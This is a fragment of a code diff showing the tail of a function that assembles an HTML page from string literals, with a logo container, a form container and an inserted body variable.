+                   "  <div class='container'>"
+                   "    <div class='logo-container'>"
+                   "      <?xml version='1.0' standalone='no'?>"
+                   "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
+                   "    </div>"
+                   "    <div class=form-container>"
+                   "      <div style='min-height: 150px'>"
+    + body + "      </div>"
+             "    </div>"
+             "  </div>"
+             "</body>"
+             "</html>";
+  return html;
+}
